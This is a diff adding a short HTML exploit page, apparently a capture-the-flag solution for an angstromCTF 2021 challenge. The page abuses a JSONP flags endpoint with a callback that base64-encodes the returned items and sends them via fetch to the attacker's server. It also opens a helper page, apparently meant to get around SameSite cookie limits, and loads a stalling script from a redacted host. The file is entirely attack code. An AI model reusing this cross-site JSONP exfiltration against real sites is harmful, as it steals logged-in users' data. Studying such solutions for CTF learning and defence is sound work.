@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="referrer" content="no-referrer">
+</head>
+<body>
+	<script>
+		function my_load(data) {
+			fetch('/' + btoa(data['items']));
+		}
+
+		window.open('/fix_samesite.html');
+	</script>
+
+	<script src="http://[REDACTED]:81/just_wait"></script>
+	<script src="https://jason.2021.chall.actf.co/flags?callback=my_load"></script>
+</body>
+</html>
